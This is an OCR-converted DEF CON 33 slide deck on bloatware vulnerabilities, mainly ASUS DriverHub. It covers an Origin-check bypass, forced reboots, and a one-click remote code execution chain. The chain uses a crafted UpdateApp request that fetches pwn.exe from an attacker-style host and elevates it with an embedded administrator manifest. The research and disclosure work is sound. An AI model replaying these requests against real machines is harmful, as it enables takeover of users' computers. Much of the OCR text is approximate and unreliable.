---
title: "7 Vulns in 7 Days Breaking Bloatware Faster Than It’s Built"
speakers: ["Leon Jacobs"]
conference: "DEF CON"
conference_full: "DEF CON 33"
edition: "33"
year: 2025
source_pdf: "DEF CON 33/Leon Jacobs - 7 Vulns in 7 Days Breaking Bloatware Faster Than It’s Built.pdf"
pages: 201
sha256: "0f31c581d8c37f3560e48944ca1fe3e6f15562efd4d37ca5c0ea1864cfc258e4"
text_chars: 53620
ocr_pages: 58
has_ocr: true
redacted_secrets: 0
ocr_confidence: 84.5
ocr_unreliable_blocks: 6
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T07:06:37Z"
---
# 7 Vulns in 7 Days Breaking Bloatware Faster Than It’s Built

**Speakers:** Leon Jacobs  
**Conference:** DEF CON 33  
**Source:** `DEF CON 33/Leon Jacobs - 7 Vulns in 7 Days Breaking Bloatware Faster Than It’s Built.pdf` (201 pages)


## Slide 1

\```
7 vulns in 7 days
breaking bloatware faster than it’s built
\```

\```
DEF CON 33
\```

## Slide 2

## Slide 3


> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Notifications Gt
© ASUS DriverHub
14:21
1 driver updates available. Click for more
information.
Clear all
```

## Slide 4


> Recovered by OCR — confidence 83/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
© ASUS DriverHub x + - fa) x
Available Updates About This PC Devices and Drivers Individual Kits Settings
Available Updates lavailable update
Drivers v Sort by | Name (AtoZ) v
```

## Slide 5


> Recovered by OCR — confidence 82/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
(G ://driverhub.asus.com/en w 5 A
Installation Completed
Installation has been completed successfully.
Available Updates
7 available updates
Available Updates $
“~ AMD Graphics Dr, nstal
```

## Slide 6

## Slide 7

## Slide 8


> Recovered by OCR — confidence 82/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
(G ://driverhub.asus.com/en w 5 A
Installation Completed
Installation has been completed successfully.
Available Updates
7 available updates
Available Updates $
“~ AMD Graphics Dr, nstal
```

## Slide 9

## Slide 10

## Slide 11


> Recovered by OCR — confidence 78/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
im [0 Elements Console Sources Network Performance Memory Application Security Lighthouse _— Recorder DOM Invader
Y Filter O) Invert More filters v All Fetch/XHR | Doc CSS || JS | Font Img = Media = Manifest WS} Wasm | Other
I 5,000 ms 10,000 ms 15,000 ms 20,000 ms 25,000 ms 30,000 ms 35,000 ms 40,000 ms 45,000 ms 50,000 ms 55,000 ms
Name “ XX Headers Payload Preview Response Initiator Timing
LJ Initialize
v General
D) driverhub/ r 7
© favicon.ico Request URL: http://127.0.0.1:53000/asus/v1.0/Devicelnfo?lang=en
Ri t Method: GET
G} Initialize equest ene
Status Code: @ 200 OK
G} Term.json?v=1739964991399
Remote Address: 127.0.0.1:8080
Referrer Policy: same-origin
0 Devicelnfo?lang=en J
G} Devicelnfo?lang=en | v Response Headers O Raw
```

## Slide 12

## Slide 13

### `Leon Jacobs`

\```
Orange Cyberdefense’s
SensePost Team
\```

\```
@leonjza
\```

\```
[research, hacking, building, ...]
\```

## Slide 14

#### `Agenda`

\```
A story about vulns in “bloatware” products.
\```

\```
Asus Driver Hub, MSI Center, Acer Control
Centre & Razer Synapse 4. (all of which have
fixes).
\```

\```
Conclusion.
\```

## Slide 15

\```
Tools you’ll see:
\```

- `Binary Ninja`

- `- dnSpyEx`

- `Frida`

- `Burp`

- `Process Explorer`

\```
Code you’ll see:
\```

   - `Pseudo-C`

   - `Assembly`

   - `.NET`

   - `JavaScript`

   - `Logs!`

- `Procmon`

- `OleView.NET`

## Slide 16

\```
ASUS DriverHub
CVE-2025-3462, CVE-2025-3463
\```

## Slide 17

\```
ASUS DriverHub
\```


> Recovered by OCR — confidence 83/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
= & ADU.exe < 0.01 14 708 K 38 396K 7008 ASUS-Driver-Update
fae COnhost.exe < 0.01 7 708 K 8492K 8580 Console Window Host
© ASUS DriverHub.exe 54 840 K 77192K 10816ASUS DriverHub
©» ADU.exe:7008 Properties
Image Performance Performance Graph Disk and Network GPU Graph Threads TCP/IP Security Environment Job
Resolve addresses
Protocol Local Address Remote Address State
-_plak.local:53000 -psf: LISTENING
TCP user-pc.plak.local:53005 .psf:0 LISTENING
OriverHub
```

## Slide 18

\```
ASUS DriverHub
\```


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
| ©» ASUS Driver Update Service Setup
ASUS DriverHub
Your device is not supported.
Sorry, your motherboard model is not supported on this site. For
driver updates, please visit the official ASUS website.
https://www.asus.com/support/
ASUS OriverHub
```

## Slide 19

\```
ASUS DriverHub
\```


> Recovered by OCR — confidence 81/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
int32_t pExecInfo Function Analysis >
void var_b98
if (data_1400574e8.b != Ip ma
Create Array... “ Invert Branch
Create Structure... S Never Branch
Edit Function Properties... Assemble... XA
Make Function at This Address U Compile C Source... XEC
Rename Current Function...
y not supported ;
Lo Reanalvze Current Function
ASUS OriverHub
```

## Slide 20


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
©» ASUS Driver Update Service Setup
ASUS DriverHub
Version: 1.0.4.9
Installation successful
ASUS DriverHub has been installed successfully.
```

## Slide 21

\```
ASUS DriverHub
\```


> Recovered by OCR — confidence 94/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
& driverhub.asus.com/en x +
SUS DriverHub
Sorry, your motherboard model is not supported on this site.
For driver updates, please visit the official ASUS website.
Go to ASUS Support
ASUS OriverHub
```

## Slide 22

\```
“IsSupport”: false -> true
\```

\```
ASUS DriverHub
\```


> Recovered by OCR — confidence 85/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
http://127.0.0.1:53...
28 GET /asus/v1.0/Initialize 200 549 JSON 127.0.0.1
27 ~~ http://127.0.0.1:53.... OPTI... /asus/v1.0/Initialize 127.0.0.1
26 ~~ http://127.0.0.1:53.... OPTI... /asus/v1.0/Initialize 127.0.0.1
25 — http://127.0.0.1:53.... OPTI... /asus/v1.0/Initialize 127.0.0.1
24 ~~ http://127.0.0.1:53.... OPTI... /asus/v1.0/Initialize 200 309 127.0.0.1
Request Response
Pretty Raw Hex & \n Pretty Raw Hex >
1
2
3
5
GET /asus/v1.0/Initialize HTTP/1.1
Host: 127.0.0.1:
53000
sec-ch-ua-platform: "windows"
Accept-Language: en-US,en;q=0.9
sec-ch-ua: "Chromium"; v="133", "Not(A:Brand";v="99"
Content-Type: application/json
sec-ch-ua-mobile: 70
User-Agent: Mozilla/5.0 (Windows NT 10.0; win64; x64) ApplewebKit/537.36 (KHTML,
like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: */*
Origin: https://driverhub.asus.com
cross-site
Sec-Fetch-Site:
Sec-Fetch-Mode:
Sec-Fetch-Dest:
cors
empty
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
2 Access-Control-Allow-origin: https://driverhub.asus.com
3 Access-Control-Allow-mMethods: GET, POST, OPTIONS
4 Access-Control-Allow-Headers: Origin, X-Requested-with, Content-Type, Accept,
Origin, Authorization
5 Content-Type: application/json; charset=UTF-8
6 Content-Length: 222
7 Keep-Alive: timeout=5, max=100
8
"ISASUS": true,
"IsSupport":false,|
"Noti fyFrequency":"Monthly",
"“websocketPort"™ : 53005
```

## Slide 23

\```
ASUS DriverHub
\```


> Recovered by OCR — confidence 92/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Available Updates About This PC Devices and Drivers Individual Kits Settings
1 available update
Available Updates
Software Y Sort by | Name (AtoZ)
“\ Armoury Crate Installer Install
Description: Install Armoury Crate, Aura Creator, and other necessary services for the full experience—from the initial setup to RGB lighting effect
adjustments. Get the latest updates and seamlessly connect with all your devices.
Version: 3.2.9.1. Release date: 2023/10/30 Size: 1.97 MB ASUS OriverHub
```

## Slide 24

## `ADU.exe ASUS DriverHub.exe`

\```
ASUS DriverHub
\```

## Slide 25

## `ADU.exe :53000`

\```
ASUS DriverHub
\```

## Slide 26

\```
ASUS DriverHub
\```


> Recovered by OCR — confidence 75/100 on the text kept, 56/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
140550c4@ char const data_140550c46[@x12 |]
14855@c58 char const data_140550c58[@x12] "/asus/v1.0/Cancel", @
14055@c7@ char const data_140550c76[@xf] = "/asus/v1.@/Log", @
| 14055@c8@ char const data_140550c80[@x12] = "/asus/v1.@/Reboot", @ |
14855@c98 char const data_140550c98[@x2e]
"[%hs] ***** Http server start
ASUS OriverHub
```

## Slide 27

\```
ASUS DriverHub
\```


> Recovered by OCR — confidence 85/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
if (!rax_36)
{
if (OpenProcessToken(GetCurrentProcess(), @x28, &TokenHand1le) )
{
LookupPrivilegeValueW(nullptr, u"SeShutdownPrivilege", &*(uint64_t*) |
NewState = 1;
int32_t var_94_1 = 2;
AdjustTokenPrivileges(TokenHandle, 8, &NewState, @, nullptr, nullptr)
if (!GetLastError())
S_17 = ExitWindowsEx(EWX_REBOOT | EWX_FORCE, @x80020@@3) ;
else
}
else
}
ASUS OriverHub
```

## Slide 28

#### `Reboot Request - Flow`

\```
https://driverhub.asus.com
\```

\```
In Browser
\```

\```
ASUS DriverHub
\```

## Slide 29

#### `Reboot Request - Flow`

\```
https://driverhub.asus.com
\```

In Browser

> fetch(“localhost:5300")

JavaScript

\```
ASUS DriverHub
\```

## Slide 30

#### `Reboot Request - Flow`

https://driverhub.asus.com In Browser
> fetch(“localhost:5300") JavaScript
ExitWindowsEx()
> Win32 API

\```
ASUS DriverHub
\```

## Slide 31

#### `Reboot Request - Testing`

\```
Invoke-WebRequest
  -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot"
\```

\```
ASUS DriverHub
\```

## Slide 32

#### `Reboot Request - Testing`

\```
Invoke-WebRequest
  -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot"
Invoke-WebRequest : Access denied
\```

\```
ASUS DriverHub
\```

## Slide 33

#### `Reboot Request - Testing`

\```
ASUS DriverHub
\```


> Recovered by OCR — confidence 82/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Reboot Request - Testing
PS C:\ProgramData\ASUS\AsusDriverHub\Log> get-content .\ADU_01_20250707115221.1log
2025-07-07 13:55:08
2025-07-07 13:55:08
2025-07-07 13:55:08
2025-07-07 13:55:08
RegQueryVaLueEx error
[postReboot] isOriginAllowed = False
[postReboot] ***** Exit **xx*
ASUS OriverHub
```

## Slide 34

#### `Reboot Request - Testing`

\```
Invoke-WebRequest
-Uri "http://127.0.0.1:53000/asus/v1.0/Reboot"
  -Method POST
  -Headers @{Origin = "https://driverhub.asus.com"}
\```

\```
ASUS DriverHub
\```

## Slide 35

#### `Reboot Request - Testing`

\```
Invoke-WebRequest
-Uri "http://127.0.0.1:53000/asus/v1.0/Reboot"
  -Method POST
  -Headers @{Origin = "https://driverhub.asus.com"}
Invoke-WebRequest : The remote server returned an
error: (500) Internal Server Error.
\```

\```
ASUS DriverHub
\```

## Slide 36

#### `Reboot Request - Testing`

\```
ASUS DriverHub
\```


> Recovered by OCR — confidence 86/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Reboot Request - Testing
PS C: \ProgramData\ASUS\AsusDriverHub\Log> get-content .\ADU_01_20250707115221.log -tail 0 -wait
2025-07-07 14:53:05 RegQueryValueEXx error
2025-07-07 14:53:05 [isOriginAllowed] Access-—Control-Allow-Origin = https://driverhub.asus.com
2025-07-07 14:53:05 [isOriginAllowed] LOCAL_ADDR = 127.0.0.1
2025-07-07 14:53:05 [postReboot] isOriginAllowed = True
2025-07-07 14:53:05 [postReboot] ***** Entery ****x*
ASUS OriverHub
```

## Slide 37

\```
ASUS DriverHub
\```


> Recovered by OCR — confidence 76/100 on the text kept, 61/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ik £0 Elements Console Sources Network Performance Memory” Application Lighthouse
Page Workspace >>
~ © _next - } catch (e) {}
v tat
> £5 app/[lang] - —auweiie(L(a,
i 4bd1b696-dbbd... - body: JSON.stringify({
|") 6-405af662329... - Event: [{
i main-app-f38f0... _ await t((@,
{+ Line 1, Column 1 ASUS DriverHub
```

## Slide 38

#### `Reboot Request - Testing`

\```
Invoke-WebRequest
-Uri "http://127.0.0.1:53000/asus/v1.0/Reboot"
-Method POST
-Headers @{
Origin = "https://driverhub.asus.com";
...
  }
-Body (ConvertTo-Json
@{ Event = @(@{ Cmd = "Reboot" }) }
  )
\```

\```
ASUS DriverHub
\```

## Slide 39

\```
ASUS DriverHub
\```


> Recovered by OCR — confidence 83/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Restarting
ASUS OriverHub
```

## Slide 40

\```
The string_contains() bug
\```

\```
ASUS DriverHub
\```

## Slide 41

#### `Origin Header Validation`

\```
https://driverhub.asus.com
\```

\```
https://driverhub.notasus.com
\```

\```
ASUS DriverHub
\```

## Slide 42

#### `Origin Header Validation`

\```
https://driverhub.asus.comhttps://driverhub.notasus.com
fetch("localhost:5300/asus/v1.0/Reboot")
\```

\```
ASUS DriverHub
\```

## Slide 43

#### `Origin Header Validation`

\```
https://driverhub.asus.comhttps://driverhub.notasus.com
fetch("localhost:5300/asus/v1.0/Reboot")
\```

\```
Origin: driverhub.asus.com
\```

\```
Origin: driverhub.notasus.com
\```

\```
ASUS DriverHub
\```

## Slide 44

#### `Origin Header Validation`

\```
https://driverhub.asus.com
\```

\```
https://driverhub.notasus.com
\```

\```
fetch("localhost:5300/asus/v1.0/Reboot")
\```

\```
Origin: driverhub.asus.com
\```

\```
Origin: driverhub.notasus.com
\```

\```
ADU.exe:53000
\```

\```
ADU.exe:53000
\```

\```
OKFAIL
\```

\```
ASUS DriverHub
\```

## Slide 45

\```
ASUS DriverHub
\```


> Recovered by OCR — confidence 80/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
if (!r12)
{
void* rcex_3@ = &r15[6];
if (r14_2 >= @x1@)
rex_3@ = r15[6];
}
ASUS OriverHub
```

## Slide 46

\```
ASUS DriverHub
\```


> Recovered by OCR — confidence 89/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
if (!memcmp(i_1, arg4, arg5))
| return i_1 - arg1;
i = sub_140437340(i_1 + 1, r14_1, (char*)rbp_3 + 1 - (i_1 + 1));
} while (i);
ASUS OriverHub
```

## Slide 47

\```
driverhub.asus.com == .asus.com
\```

\```
ASUS DriverHub
\```

## Slide 48

\```
driverhub.asus.com == .asus.com
\```

\```
ASUS DriverHub
\```

## Slide 49

\```
driverhub.asus.com == .asus.com
\```

\```
ASUS DriverHub
\```

## Slide 50

\```
driverhub.asus.com == .asus.com
\```

\```
ASUS DriverHub
\```

## Slide 51

\```
driverhub.asus.com == .asus.com
\```

\```
ASUS DriverHub
\```

## Slide 52

\```
driverhub.asus.com == .asus.com
\```

\```
ASUS DriverHub
\```

## Slide 53

\```
driverhub.asus.com == .asus.com
\```

\```
ASUS DriverHub
\```

## Slide 54

\```
driverhub.asus.com == .asus.com
\```

\```
ASUS DriverHub
\```

## Slide 55

##### `driverhub.asus.com == .asus.com`

\```
ASUS DriverHub
\```

## Slide 56

\```
driverhub.asus.com == .asus.com
\```

\```
ASUS DriverHub
\```

## Slide 57

\```
driverhub.asus.com == .asus.com
Ok
\```

\```
ASUS DriverHub
\```

## Slide 58

\```
driverhub.asus.com.local == .asus.com
\```

\```
ASUS DriverHub
\```

## Slide 59

\```
driverhub.asus.com.local == .asus.com
\```

\```
ASUS DriverHub
\```

## Slide 60

\```
driverhub.asus.com.local == .asus.com
\```

\```
ASUS DriverHub
\```

## Slide 61

\```
driverhub.asus.com.local == .asus.com
\```

\```
ASUS DriverHub
\```

## Slide 62

\```
driverhub.asus.com.local == .asus.com
\```

\```
ASUS DriverHub
\```

## Slide 63

\```
driverhub.asus.com.local == .asus.com
\```

\```
ASUS DriverHub
\```

## Slide 64

\```
driverhub.asus.com.local == .asus.com
\```

\```
ASUS DriverHub
\```

## Slide 65

\```
driverhub.asus.com.local == .asus.com
\```

\```
ASUS DriverHub
\```

## Slide 66

##### `driverhub.asus.com.local == .asus.com`

\```
ASUS DriverHub
\```

## Slide 67

\```
driverhub.asus.com.local == .asus.com
\```

\```
ASUS DriverHub
\```

## Slide 68

\```
driverhub.asus.com.local == .asus.com
Ok?
\```

\```
ASUS DriverHub
\```

## Slide 69

#### `Reboot Request – Wrong Origin`

\```
Invoke-WebRequest
-Uri "http://127.0.0.1:53000/asus/v1.0/Reboot"
-Method POST
-Headers @{
Origin = "https://driverhub.asus.com.local";
...
  }
-Body (ConvertTo-Json
@{ Event = @(@{ Cmd = "Reboot" }) }
  )
\```

\```
ASUS DriverHub
\```

## Slide 70

\```
ASUS DriverHub
\```


> Recovered by OCR — confidence 83/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Restarting
ASUS OriverHub
```

## Slide 71

\```
By just visiting a page
(intended or not)...
\```

• `You can reboot your friend's computer.`

\```
ASUS DriverHub
\```

## Slide 72

\```
By just visiting a page
(intended or not)...
\```

- `You can reboot your friend's computer.`

- `Arbitrary origins can interact with the ASUS DriverHub web server.`

\```
ASUS DriverHub
\```

## Slide 73

## `Gaining RCE`

\```
ASUS DriverHub
\```

## Slide 74

\```
/asus/v1.0/Initialize
/asus/v1.0/DeviceInfo
/asus/v1.0/InstallApp
/asus/v1.0/NotifyFrequency
/asus/v1.0/UpdateApp
/asus/v1.0/WriteFbk
/asus/v1.0/Status
/asus/v1.0/Cancel
/asus/v1.0/Log
/asus/v1.0/Reboot
\```

\```
ASUS DriverHub
\```

## Slide 75

\```
/asus/v1.0/Initialize
/asus/v1.0/DeviceInfo
/asus/v1.0/InstallApp
/asus/v1.0/NotifyFrequency
/asus/v1.0/UpdateApp
/asus/v1.0/WriteFbk
/asus/v1.0/Status
/asus/v1.0/Cancel
/asus/v1.0/Log
/asus/v1.0/Reboot
\```

\```
ASUS DriverHub
\```

## Slide 76

\```
UpdateApp Analysis
{
  "List": [
    {
      "Url": "",
      "Name": ""
    }
  ]
}
\```

\```
ASUS DriverHub
\```

## Slide 77

#### `UpdateApp Analysis`

\```
{
  "List": [
    {
      "Url": "",
      "Name": ""
    }
  ]
}
\```

\```
ASUS DriverHub
\```

## Slide 78

\```
UpdateApp Analysis
{
  "List": [
    {
      "Url": "//pwn.local/pwn.exe",
      "Name": ""
    }
  ]
}
\```

\```
ASUS DriverHub
\```

## Slide 79

#### `UpdateApp Analysis`

\```
Invoke-WebRequest
-Uri "http://127.0.0.1:53000/asus/v1.0/UpdateApp"
  -Method POST
-Headers @{
Origin= "https://driverhub.asus.com.local";
...
  }
-Body(ConvertTo-Json
@{ List = @(@{
Url = "http://pwn.local/pwn.exe";
Name = ""
    }) }
  )
\```

\```
ASUS DriverHub
\```

## Slide 80

#### `UpdateApp Analysis`

\```
ASUS DriverHub
\```


> Recovered by OCR — confidence 86/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
UpdateApp Analysis
PS C:\ProgramData\ASUS\AsusDriverHub\Log> Get-Content -path .\ADU_01_20250730135131.log -Wait -Tail 0
2025-07-30
2025-07-30
2025-07-30
2025-07-30
2025-07-30
2025-07-30
2025-07-30
2025-07-30
2025-07-30
2025-07-30
13:
13:
13:
13:
13:
13:
13:
13:
13:
13:
57:
57:
57:
57:
57:
57:
57:
57:
57:
00
00
00
00
00
00
00
00
00
00
RegQueryValueEx error
[isOriginAllowed] Access-Control-Allow-Origin = driverhub.asus.com
[isOriginAllowed] LOCAL_ADDR = 127.0.0.1
[postUpdateApp] isOriginAllowed = True
[postUpdateApp] ***** Entery * KKKKK
[postUpdateA
[updateAgent] Start Update
[updateAgent]
[postUpdateA
[postUpdateApp] ***** Exit ****x
1/pwn.exe" 1 "Name":" "ryt
ASUS OriverHub
```

## Slide 81

#### `UpdateApp Analysis`

\```
Remember string_contains() ?
\```

\```
ASUS DriverHub
\```

## Slide 82

#### `UpdateApp Analysis`

\```
{
  "List": [
    {
      "Url": "//e.asus.com.pwn.local/pwn.exe",
      "Name": ""
    }
  ]
}
\```

\```
ASUS DriverHub
\```

## Slide 83

#### `UpdateApp Analysis`

\```
ASUS DriverHub
\```


> Recovered by OCR — confidence 88/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
UpdateApp Analysis
PS C: \ProgramData\ASUS\AsusDriverHub\Log> Get-Content —path
00:
00:
00:
00:
00:
00:
00:
00:
00:
00:
00:
00:
00:
00:
2025-07-30
2025-07-30
2025-07-30
2025-07-30
2025-07-30
2025-07-30
2025-07-30
2025-07-30
2025-07-30
2025-07-30
2025-07-30
2025-07-30
2025-07-30
2025-07-30
14:
14:
14:
14:
14:
14:
14;
14:
14:
14:
14:
14:
14:
14:
30
30
30
30
31
31
31
31
31
. \ADU_01_20250730135131.log -Wait -Tail 0
RegQueryValueEx error
[isOriginAllowed] Access-Control-Allow-Origin =
[isOriginAllowed] LOCAL_ADDR = 127.0.0.1
[postUpdateApp] isOriginAllowed = True
[postUpdateApp] ***** Entery ****x*
[postUpdateApp] request body = {"List":[{"Url":"http://exploit.asus.com.pwn.Local/pwn.exe", "Name
[updateAgent] Start Update
[updateAgent] Filename = pwn.exe
[updateAgent] Start URLDownloadToFile
[updateAgent] URLDownloadToFile Success
[updateAgent] C:\ProgramData\ASUS\AsusDriverHub\SupportTemp\pwn.exe A isted
[updateAgent] ]
[postUpdateApp] response content = Fail
[postUpdateApp] ***** Exit ***x*
driverhub.asus.com
ASUS OriverHub
```

## Slide 84

\```
ASUS DriverHub
\```


> Recovered by OCR — confidence 82/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
int128_t s;
__builtin_memset(&s, 8, @x64);
sub_14013c240(&s, @x64, "%s", &s_1);
_strlwr(&s) ;
char result_2 = result_1;
result_2 = @;
result = (uint64_t)result_2;
}
```

## Slide 85

\```
ASUS DriverHub
\```


> Recovered by OCR — confidence 77/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
= w) secretsquirrel / SigThief Q!\8\- dos ©
<> Code ©) Issues [{} Pullrequests ©) Actions [fF Projects © Security |~ Insights
») SigThief Pubic © Sponsor @Watch 57 ~ % Fork 477° ~ yy Star 23k ~~
master ~ PF OS Go to file + © Code» About
Stealing Signatures and Making
rt] secretsquirrel test ffb501b - 4 years ago +O) One Invalid Signature at a Time
@ github Create FUNDING.yml 5 years ago python certificates = python3
pe testing-antivirus
[) LICENSE Initial commit 8 years ago
O Readme
[| README.md Update README.md 4 years ago
3{8 BSD-3-Clause license
(5. sigthief.py test 4 years ago A- Activity
```

## Slide 86

\```
1-click RCE DEMO
Asus DriverHub v1.0.4.9
\```

## Slide 87

## Slide 88

\```
Running Elevated with a UAC /
SxS Assembly Manifest
\```

\```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
      <requestedPrivileges>
\```

\```
        <requestedExecutionLevel level="requireAdministrator" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </trustInfo>
</assembly>
\```

\```
ASUS DriverHub
\```

## Slide 89

\```
Running Elevated with a UAC /
SxS Assembly Manifest
\```

\```
mt.exe \
  -manifest elevated.manifest \
  -outputresource:pwn.exe;#1
\```

\```
ASUS DriverHub
\```

## Slide 90

\```
Running Elevated with a UAC /
SxS Assembly Manifest
\```

\```
ASUS DriverHub
\```


> Recovered by OCR — confidence 82/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Running Elevated with a UAC ;
342 Assembly Manifest
SupportTemp
+ ‘+ ProgramData > ASUS > AsusDriverHub >
Sort View
Date modified
» Home
ff asus-pwn.exe 2025/07/28 18:18 Application
getUpdataltemFinish 2025/07/28 17:19 File
@ OneDrive
model.xml 2025/07/28 17:19 XML Source File
ASUS OriverHub
```

## Slide 91

#### `Running Elevated with a UAC / SxS Assembly Manifest`

\```
ASUS DriverHub
\```


> Recovered by OCR — confidence 87/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Running Elevated with
342 Assembly Manifest
p @ Asus DriverHub v1.0.4.9 CVE-202° X =F
A Notsecure | exploit.asus.com.pwn.local/pwn
CVE-2025-3462, CVE-2025-3463 Demo
Waiting a sec before sending payload...
Making request to 127.0.0.1:53000/asus/v1.0/UpdateApp...
Payload delivered successfully! Response code: 200
Response body: OK
BY Windows PowerShell x ap OY
PS C:\Users\user.PLAK> net user
User accounts for \\USER-PC
Administrator DefaultAccount Guest
user WDAGUtilityAccount
The command completed successfully.
PS C:\Users\user.PLAK>
PS C:\Users\user.PLAK>
PS C:\Users\user.PLAK> net user
User accounts for \\USER-PC
Administrator
Guest user
The command completed successfully.
PS C:\Users\user.PLAK> |
WDAGUtilityAccount
ASUS OriverHub
```

## Slide 92

\```
ASUS DriverHub
\```


> Recovered by OCR — confidence 87/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
My Favorites Main AiTweaker Advanced Monitor Boot Tool Exit
€© Tool\ASUS DriverHub
Download & Install ASUS DriverHub app Disabled
® This item allows you to enable DriverHub downl
load process, DriverHub app can hel
Fis Mery akg PP P you manage and download the latest drivers and Utilities updates f
Or your
```

## Slide 93

#### `ASUS DriverHub Summary`

- `An alternative way to reboot your friend's computer or execute code.`

- `Can auto install itself depending on BIOS setting.`

- `Misuse of an “Unauthenticated” RPC mechanism.`

- `Draft Chrome Spec to gate private network access. https://wicg.github.io/private-network-access/`

- `Disclosure was messy (more on that later)`

\```
ASUS DriverHub
\```

## Slide 94

## Slide 95

\```
What are
other vendors doing?
\```

## Slide 96

\```
MSI Center
CVE-2025-27812, CVE-2025-27813
\```

## Slide 97

\```
MSI Center
\```


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
(') Support $2. Member Center
Live Update
Please use the local administrator account to support this function.
To create a local user account, please follow below steps:
Select Start > Settings > Accounts. Select Family & other users(or Other users) > Add
someone else to this PC > set Account type as Administrator.
MSI Center
```

## Slide 98

\```
MSI Center
\```


> Recovered by OCR — confidence 85/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
= ‘i |MSI_Central_Service.exe 4032 MSI Center Service Micro-Star Int'l Co., Ltd. 32-bit NT AUTHORITY\SYSTEM
=| [i \MSI.CentralServer.exe 7036 MSI.CentralServer Micro-Star Int'l Co., Ltd. 32-bit NT AUTHORITY\SYSTEM
conhost.exe 7068 Console Window Host Microsoft Corporation 64-bitNT AUTHORITY\SYSTEM
```

## Slide 99

#### `Privileged Process Listening on an Arbitrary TCP Port`

\```
MSI Center
\```


> Recovered by OCR — confidence 83/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Listening
on an Arbitrary TCP Port
“gj |MSI_Central_Service.exe | 4032 MSI Center Service Micro-Star Int'l Co., Ltd. 32-bit NT AUTHORITY\SYSTEM
— |g MSI.CentralServer.exe 7036 MSI.CentralServer Micro-Star Int'l Co., Ltd. 32-bit NT AUTHORITY\SYSTEM
conhost.exe 7068 Console Window Host Microsoft Corporation 64-bitNT AUTHORITY\SYSTEM
.NET Assemblies .NET Performance
Image Performance Performance Graph Disk and Network GPU Graph Threads TCP/I
Resolve addresses
Pr... Local Address Remote Address State
TCP user-pc.plak.local:32683 .psf:0 LISTENING
TCP user-pc.plak.local:33683 ._psf:0 LISTENING
TCP user-pc.plak.local:33683 user-pc.plak.local:49863 ESTABLISHED
UDP .psf:49667 “*
UDP .psf:49668 “*
```

## Slide 100

#### `Custom TCP Protocol`

\```
MSI Center
\```

## Slide 101

\```
.NET Binary == Easy Reversing
\```


> Recovered by OCR — confidence 79/100 on the text kept, 73/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
HET Binary == Easy Reversing
a dnSpy v6.5.1 (64-bit, .NET)
File Edit View Debug Window
Assembly Explorer
4 im) MSI.CentralServer (3.2024.1202.1)
2S PE
> &O Type References
> oO References
> GB Resources
> 8 CloudSetting @02000023
Help
> 4% CloudSetting_V2 @02000024
> 9% C_Common @02000014
> 2g C_DynLoad_SDK @02000005
> 3, C_ExFeatures @0200002C
> %% C Features @02000006
D OB, C_NB Features @02000008
> 4% C WatcherHandler @02000015
> 43 c_wsuUs @02000009
> 9%, DataCenter @02000016
> %Y Define BaseData @02000027
©
vx
Program *<
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.I0;
using System.Text;
using CS_CommonAPT;
using Microsoft.Win32;
namespace MSI.CentralServer
{
// Token: @x®2@@@0@29 RID: 41
public class Program
{
// Token: ®x@60@017A RID: 378 RVA: 0x00010124 File Offset: @xQQQ@0E324
